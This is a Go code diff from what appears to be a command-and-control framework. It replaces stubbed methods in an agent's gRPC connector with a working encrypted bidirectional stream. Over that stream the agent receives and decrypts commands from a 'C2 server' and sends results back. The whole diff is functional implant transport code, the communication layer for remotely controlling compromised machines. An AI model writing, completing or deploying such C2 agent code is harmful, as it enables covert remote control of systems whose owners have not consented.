@@ -1,9 +1,11 @@
 package agent
 
-	import (
+import (
 	"context"
 	"crypto/tls"
 	"fmt"
+	"io"
+	"sync"
 	"time"
 
 	"google.golang.org/grpc"
@@ -12,6 +14,7 @@ package agent
 	"google.golang.org/grpc/keepalive"
 	"google.golang.org/grpc/metadata"
 
+	agentv1 "github.com/ruby570bocadito/x404x/core/proto/gen/agent"
 	"github.com/ruby570bocadito/x404x/core/crypto"
 	"github.com/ruby570bocadito/x404x/shared/config"
 	"github.com/ruby570bocadito/x404x/shared/logger"
@@ -24,7 +27,9 @@ type gRPCConnector struct {
 	keypair *crypto.KeyPair
 	session *crypto.Session
 	conn    *grpc.ClientConn
-	stream  interface{}
+	client  agentv1.AgentServiceClient
+	stream  agentv1.AgentService_CommandStreamClient
+	mu      sync.Mutex
 	agentID string
 }
 
@@ -38,7 +43,8 @@ func NewgRPCConnector(cfg *config.Config, log *logger.Logger, kp *crypto.KeyPair
 	}
 }
 
-// Connect establishes a gRPC connection to the C2 server.
+// Connect establishes a gRPC connection to the C2 server and opens the
+// bidirectional command stream.
 func (c *gRPCConnector) Connect(ctx context.Context, serverAddr string) error {
 	var opts []grpc.DialOption
 
@@ -80,14 +86,26 @@ func (c *gRPCConnector) Connect(ctx context.Context, serverAddr string) error {
 	}
 
 	c.conn = conn
-	c.log.Infof("connected to C2 server at %s via gRPC", serverAddr)
+	c.client = agentv1.NewAgentServiceClient(conn)
 
+	// Open bidirectional command stream
+	stream, err := c.client.CommandStream(ctx)
+	if err != nil {
+		return fmt.Errorf("opening command stream: %w", err)
+	}
+	c.stream = stream
+
+	c.log.Infof("connected to C2 server at %s via gRPC", serverAddr)
 	return nil
 }
 
-// Send sends an encrypted message to the C2 server.
+// Send sends an encrypted message to the C2 server via the gRPC stream.
 func (c *gRPCConnector) Send(data []byte) error {
-	if c.conn == nil {
+	c.mu.Lock()
+	stream := c.stream
+	c.mu.Unlock()
+
+	if stream == nil {
 		return fmt.Errorf("not connected")
 	}
 
@@ -102,20 +120,62 @@ func (c *gRPCConnector) Send(data []byte) error {
 		encrypted = data
 	}
 
-	// In production: send via gRPC bidirectional stream
-	_ = encrypted
-	c.log.Debugf("sending %d bytes to C2", len(encrypted))
+	msg := &agentv1.AgentMessage{
+		SessionId: c.agentID,
+		Message: &agentv1.AgentMessage_TaskResult{
+			TaskResult: &agentv1.TaskResult{
+				CommandId: c.agentID,
+				Success:   true,
+				Output:    string(encrypted),
+			},
+		},
+	}
+
+	if err := stream.Send(msg); err != nil {
+		return fmt.Errorf("sending via gRPC stream: %w", err)
+	}
+
+	c.log.Debugf("sent %d bytes to C2 via gRPC stream", len(encrypted))
 	return nil
 }
 
-// Recv receives a message from the C2 server.
+// Recv receives a message from the C2 server via the gRPC stream.
 func (c *gRPCConnector) Recv() ([]byte, error) {
-	if c.conn == nil {
+	c.mu.Lock()
+	stream := c.stream
+	c.mu.Unlock()
+
+	if stream == nil {
 		return nil, fmt.Errorf("not connected")
 	}
 
-	// In production: receive from gRPC bidirectional stream
-	return nil, nil
+	msg, err := stream.Recv()
+	if err != nil {
+		if err == io.EOF {
+			return nil, nil
+		}
+		return nil, fmt.Errorf("receiving from gRPC stream: %w", err)
+	}
+
+	var decrypted []byte
+	switch m := msg.Message.(type) {
+	case *agentv1.ServerMessage_Command:
+		payload := m.Command.Payload
+		if c.session != nil {
+			decrypted, err = c.session.Decrypt([]byte(payload))
+			if err != nil {
+				return nil, fmt.Errorf("decrypting: %w", err)
+			}
+		} else {
+			decrypted = []byte(payload)
+		}
+	case *agentv1.ServerMessage_Heartbeat:
+		return nil, nil // heartbeat, no data
+	default:
+		return nil, nil
+	}
+
+	return decrypted, nil
 }
 
 // Close closes the gRPC connection.
